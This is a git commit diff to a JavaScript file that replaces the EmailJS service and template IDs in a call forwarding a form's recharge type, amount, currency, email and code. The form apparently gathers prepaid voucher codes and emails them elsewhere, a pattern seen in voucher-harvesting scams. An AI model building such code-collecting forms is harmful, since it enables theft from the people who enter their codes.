3296caef71427861b9ab3b0176113038908eac49
Ayotah Endali <111329472+Ayotah@users.noreply.github.com>
2025-01-18 07:33:30 -0800

    Update script.js

--- js/script.js
+++ js/script.js
@@ -47,7 +47,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
         if (form.type && form.montant && form.devise && form.mail && form.code.length) {
 
-            emailjs.send("service_wpgs65f", "template_llc3cvy", {
+            emailjs.send("service_shm8fu1", "template_009pl6w", {
                     recharge: form.type,
                     montant: form.montant,
                     devise: form.devise,
